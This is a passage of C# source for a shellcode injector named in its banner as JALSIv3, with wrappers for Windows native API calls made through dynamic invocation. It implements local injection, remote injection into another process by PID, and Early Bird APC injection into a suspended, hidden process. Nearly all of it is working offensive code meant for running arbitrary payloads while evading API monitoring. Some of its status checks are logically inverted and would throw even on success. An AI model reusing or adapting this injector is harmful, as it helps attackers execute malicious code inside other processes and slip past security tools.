        object[] funcargs = { ThreadHandle, SuspendCount };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtAlertResumeThread", typeof(Delegates.NtAlertResumeThread), ref funcargs);
        if (retValue != NTSTATUS.Success || retValue != NTSTATUS.Wait0) {
            throw new InvalidOperationException("shit cock happens, " + retValue);
        }
    }

    public static void NtClose(IntPtr Handle) {
        // Craft an array for the arguments
        object[] funcargs = { Handle };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtClose", typeof(Delegates.NtClose), ref funcargs);
        if (retValue == NTSTATUS.InvalidHandle) {
            throw new InvalidOperationException("Handle is not a valid handle");
        }
        if (retValue == NTSTATUS.Success) {
            throw new InvalidOperationException("calling thread does not have permission to close the handle");
        }
    }

    public static IntPtr NtOpenThread(int TID, ThreadAccess DesiredAccess)
    {
        // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
        IntPtr ThreadHandle = IntPtr.Zero;
        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
        CLIENT_ID ci = new CLIENT_ID();
        ci.UniqueThread = (IntPtr)TID;

        // Craft an array for the arguments
        object[] funcargs = { ThreadHandle, DesiredAccess, oa, ci };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtOpenThread", typeof(Delegates.NtOpenThread), ref funcargs);
        if (retValue != NTSTATUS.Success && retValue == NTSTATUS.InvalidCid)
        {
            throw new InvalidOperationException("An invalid client ID was specified.");
        }
        if (retValue != NTSTATUS.Success)
        {
            throw new UnauthorizedAccessException("Access is denied.");
        }

        // Update the modified variables
        ThreadHandle = (IntPtr)funcargs[0];

        return ThreadHandle;
    }

    public static void NtSuspendThread(IntPtr ThreadHandle) {
        // Craft an array for the arguments
        object[] funcargs = { ThreadHandle };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtSuspendThread", typeof(Delegates.NtSuspendThread), ref funcargs);
        if (retValue != NTSTATUS.Success || retValue != NTSTATUS.Wait0) {
            throw new InvalidOperationException("Shit cock happens, " + retValue);
        }
    }
}

public class JALSI {

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttributes;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdErr;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [Flags]
    public enum CreationFlags
    {
        CreateSuspended = 0x00000004,
        DetachedProcess = 0x00000008,
        CreateNoWindow = 0x08000000,
        CreateUnicodeEnv = 0x00000400
    }

    // Ple-please forgive me from using P/Invoke,ma-master
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    public static UInt32 PAGE_READWRITE = 0x04; 
    public static UInt32 PAGE_EXECUTE_READ = 0x20;
    public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

	public static bool LocalInject(byte[] syelkot) {
		// just another dope-ass banner :D
		Console.WriteLine("[----------------------------------------------]");
		Console.WriteLine("[JALSIv3 - Just Another Lame Sh3llc0d3 Injector]");
		Console.WriteLine("[           Written By GetRektBoy724           ]");
		Console.WriteLine("[----------------------------------------------]");
		Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
		IntPtr ProcessHandle = new IntPtr(-1); // we just need our pseudo-handle,this is just the same as GetCurrentProcess function ;)
	    IntPtr syelkotLength = new IntPtr(syelkot.Length);
	    Console.WriteLine("[*] Allocating memory...");
        IntPtr AllocationAddress = Marshal.AllocHGlobal((int)syelkot.Length);
		Console.WriteLine("[+] Memory allocated at : {0}!", AllocationAddress.ToString("X4"));
		Console.WriteLine("[*] Copying sh3llc0d3 at allocated memory... ");
		// copying/planting syelkot to allocated memory
		Marshal.Copy(syelkot, 0, AllocationAddress, syelkot.Length);
		// re-read the address to check if the syelkot is planted correctly
		byte[] CheckSyelkot = new byte[syelkot.Length];
		Marshal.Copy(AllocationAddress, CheckSyelkot, 0, syelkot.Length);
		bool checkSyelkotAfterPlanted = CheckSyelkot.SequenceEqual(syelkot);
		if (checkSyelkotAfterPlanted) {
            Console.WriteLine("[+] Sh3llc0d3 planted and ready to get executed!");
            UInt32 newProtect = 0;
            DInvokeCore.NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref syelkotLength, PAGE_EXECUTE_READWRITE, ref newProtect);
			// parameters for NtCreateThreadEx
			IntPtr threadHandle = new IntPtr(0);
            DInvokeCore.ACCESS_MASK desiredAccess = DInvokeCore.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | DInvokeCore.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            int stackZeroBits = 0;
            int sizeOfStackCommit = 0xFFFF;
            int sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);
            IntPtr ZeroPointerToCheck = new IntPtr(0);
            // create new thread
            Console.WriteLine("[*] Creating new thread to execute the sh3llc0d3...");
            var createThreadResult = DInvokeCore.NtCreateThreadEx(ref threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            if (threadHandle != ZeroPointerToCheck) {
            	Console.WriteLine("[+] Thread created at {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
                Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
        		return true;
            }else {
            	Console.WriteLine("[-] Failed to create new thread with error of {0}! [-]", createThreadResult);
            	return false;
            }
		}else {
			Console.WriteLine("[-] Copied shellcode is broken,cant continue! [-]");
			return false;
		}
	}

    public static bool RemoteInject(int TargetProcessID, byte[] syelkot) {
        // just another dope-ass banner :D
        Console.WriteLine("[----------------------------------------------]");
        Console.WriteLine("[JALSIv3 - Just Another Lame Sh3llc0d3 Injector]");
        Console.WriteLine("[           Written By GetRektBoy724           ]");
        Console.WriteLine("[----------------------------------------------]");
        Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
        IntPtr TargetProcessHandle = DInvokeCore.NtOpenProcess((UInt32)TargetProcessID, DInvokeCore.ProcessAccessFlags.PROCESS_ALL_ACCESS);
        Console.WriteLine("[*] Got handle for PID {0} : {1}", TargetProcessID, TargetProcessHandle.ToString("X4"));
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        IntPtr AllocationSize = new IntPtr(syelkot.Length);
        UInt32 AllocationType = (UInt32)DInvokeCore.AllocationType.Commit | (UInt32)DInvokeCore.AllocationType.Reserve;
        Console.WriteLine("[*] Allocating memory...");
        DInvokeCore.NtAllocateVirtualMemory(TargetProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref AllocationSize, AllocationType, PAGE_READWRITE);
        Console.WriteLine("[+] Memory allocated at : {0}!", AllocationAddress.ToString("X4"));
        Console.WriteLine("[*] Copying sh3llc0d3 at allocated memory... ");
        // storing the shellcode temporarily in unmanaged memory
        IntPtr ShellcodeInUnmanagedMem = Marshal.AllocHGlobal(syelkot.Length);
        Marshal.Copy(syelkot, 0, ShellcodeInUnmanagedMem, syelkot.Length);
        // copying/planting shellcode from unmanaged temporal memory to allocated memory
        int shellcodesWritten = (int)DInvokeCore.NtWriteVirtualMemory(TargetProcessHandle, AllocationAddress, ShellcodeInUnmanagedMem, (UInt32)syelkot.Length);
        // check if written bytes is as big as the shellcode
        if (shellcodesWritten == syelkot.Length) {
            Marshal.FreeHGlobal(ShellcodeInUnmanagedMem);
            Console.WriteLine("[+] Sh3llc0d3 planted and ready to get executed!");
            UInt32 oldProtect = 0;
            IntPtr syelkotLength = new IntPtr(syelkot.Length);
            // preventing RWX
            DInvokeCore.NtProtectVirtualMemory(TargetProcessHandle, ref AllocationAddress, ref syelkotLength, PAGE_EXECUTE_READ, ref oldProtect);
            // parameters for NtCreateThreadEx
            IntPtr threadHandle = new IntPtr(0);
            DInvokeCore.ACCESS_MASK desiredAccess = DInvokeCore.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | DInvokeCore.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            int stackZeroBits = 0;
            int sizeOfStackCommit = 0xFFFF;
            int sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);
            IntPtr ZeroPointerToCheck = new IntPtr(0);
            // create new thread
            Console.WriteLine("[*] Creating new thread to execute the sh3llc0d3...");
            var createThreadResult = DInvokeCore.NtCreateThreadEx(ref threadHandle, desiredAccess, pObjectAttributes, TargetProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            if (threadHandle != ZeroPointerToCheck) {
                Console.WriteLine("[+] Thread created at {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
                Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
                return true;
            }else {
                Console.WriteLine("[-] Failed to create new thread with error of {0}! [-]", createThreadResult);
                return false;
            }
        }else {
            Console.WriteLine("[-] Copied shellcode is broken,cant continue! [-]");
            return false;
        }        
    }

    public static bool QueueAPCInject(string PathToExecutableForProcess, byte[] syelkot) { // Early Bird Queue APC Injection (with spawning new process in suspended state)
        // just another dope-ass banner
        Console.WriteLine("[----------------------------------------------]");
        Console.WriteLine("[JALSIv3 - Just Another Lame Sh3llc0d3 Injector]");
        Console.WriteLine("[           Written By GetRektBoy724           ]");
        Console.WriteLine("[----------------------------------------------]");
        Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
        // CreateProcess parameters 
        STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        tSec.nLength = Marshal.SizeOf(tSec);
        CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcess | CreationFlags.CreateNoWindow | CreationFlags.CreateUnicodeEnv;
        // spawn the new process
        Console.WriteLine("[*] Spawning new process with executable {0} ...", PathToExecutableForProcess);
        bool CreateProcessResult = CreateProcess(PathToExecutableForProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        if (CreateProcessResult) {
            Console.WriteLine("[+] {0}'s process spawned!", PathToExecutableForProcess);
            // NtAllocateVirtualMemory parameters
            IntPtr AllocationAddress = new IntPtr();
            IntPtr ZeroBitsThatZero = IntPtr.Zero;
            IntPtr AllocationSize = new IntPtr(syelkot.Length);
            UInt32 AllocationType = (UInt32)DInvokeCore.AllocationType.Commit | (UInt32)DInvokeCore.AllocationType.Reserve;
            // allocate memory at target process
            Console.WriteLine("[*] Allocating memory at spawned process...");
            DInvokeCore.NtAllocateVirtualMemory(pInfo.hProcess, ref AllocationAddress, ZeroBitsThatZero, ref AllocationSize, AllocationType, PAGE_READWRITE);
            Console.WriteLine("[+] Memory allocated at : {0}!", AllocationAddress.ToString("X4"));
            Console.WriteLine("[*] Copying sh3llc0d3 at allocated memory... ");
            // storing the shellcode temporarily in unmanaged memory
            IntPtr ShellcodeInUnmanagedMem = Marshal.AllocHGlobal(syelkot.Length);
            Marshal.Copy(syelkot, 0, ShellcodeInUnmanagedMem, syelkot.Length);
            // copying/planting shellcode from unmanaged temporal memory to allocated memory
            int shellcodesWritten = (int)DInvokeCore.NtWriteVirtualMemory(pInfo.hProcess, AllocationAddress, ShellcodeInUnmanagedMem, (UInt32)syelkot.Length);
            if (shellcodesWritten == syelkot.Length) {
                Marshal.FreeHGlobal(ShellcodeInUnmanagedMem);
                Console.WriteLine("[+] Sh3llc0d3 planted and ready to get executed!");
                UInt32 oldProtect = 0;
                IntPtr syelkotLength = new IntPtr(syelkot.Length);
                // preventing RWX
                DInvokeCore.NtProtectVirtualMemory(pInfo.hProcess, ref AllocationAddress, ref syelkotLength, PAGE_EXECUTE_READ, ref oldProtect);
                Console.WriteLine("[*] Queueing APC...");
                // Queue user APC
                DInvokeCore.NtQueueApcThread(ref pInfo.hThread, AllocationAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine("[+] APC thread queued!");
                Console.WriteLine("[*] Resuming thread and executing APC...");
                DInvokeCore.NtAlertResumeThread(pInfo.hThread, 0);
                Console.WriteLine("[+] Sh3llc0d3 executed!");
                Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
                return true;
            }else {
                Console.WriteLine("[-] Copied shellcode is broken,cant continue! [-]");
                return false;
            }  
        }else {
            Console.WriteLine("[-] Failed to spawn the new process because of code {0}!", (Marshal.GetLastWin32Error()));
            return false;
        }
    }
}